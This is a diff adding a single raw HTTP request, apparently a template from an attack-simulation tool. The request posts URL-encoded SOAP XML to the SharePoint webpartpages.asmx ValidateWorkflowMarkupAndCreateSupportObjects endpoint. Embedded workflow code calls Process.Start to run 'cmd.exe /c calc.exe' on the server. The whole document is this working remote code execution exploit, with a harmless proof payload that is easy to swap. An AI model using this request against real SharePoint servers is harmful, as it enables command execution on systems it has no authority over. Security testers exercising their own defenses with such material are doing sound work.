@@ -1,0 +1,9 @@
+POST /page{PICUSID}/_vti_bin/webpartpages.asmx HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: SOAPAction: http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjects
+Content-Type: text/xml; charset=utf-8
+Content-Length: 1287
+
+%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3Csoap%3AEnvelope%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%20xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22%20xmlns%3Asoap%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%3E%3Csoap%3ABody%3E%3CValidateWorkflowMarkupAndCreateSupportObjects%20xmlns%3D%22http%3A%2F%2Fmicrosoft.com%2Fsharepoint%2Fwebpartpages%22%3E%3CworkflowMarkupText%3E%3C!%5BCDATA%5B%3CSequentialWorkflowActivity%20x%3AClass%3D%22MyWorkflow%22%20x%3AName%3D%22foobar%22%20xmlns%3Ax%3D%22http%3A%2F%2Fschemas.microsoft.com%2Fwinfx%2F2006%2Fxaml%22%20xmlns%3D%22http%3A%2F%2Fschemas.microsoft.com%2Fwinfx%2F2006%2Fxaml%2Fworkflow%22%3E%3CSequentialWorkflowActivity%20Enabled%3D%22False%22%3E%3Cx%3ACode%3EObject%20test%20%3D%20System.Diagnostics.Process.Start(%22cmd.exe%22%2C%20%22%2Fc%20calc.exe%22)%3Bprivate%20void%20SayHello(object%20sender%2Cobject%20test)%20%7B%2F%2FToDo!%7D%3C%2Fx%3ACode%3E%3C%2FSequentialWorkflowActivity%3E%3C%2FSequentialWorkflowActivity%3E%5D%5D%3E%3C%2FworkflowMarkupText%3E%3CrulesText%3E%3C%2FrulesText%3E%3CconfigBlob%3E%3C%2FconfigBlob%3E%3Cflag%3E2%3C%2Fflag%3E%3C%2FValidateWorkflowMarkupAndCreateSupportObjects%3E%3C%2Fsoap%3ABody%3E%3C%2Fsoap%3AEnvelope%3E
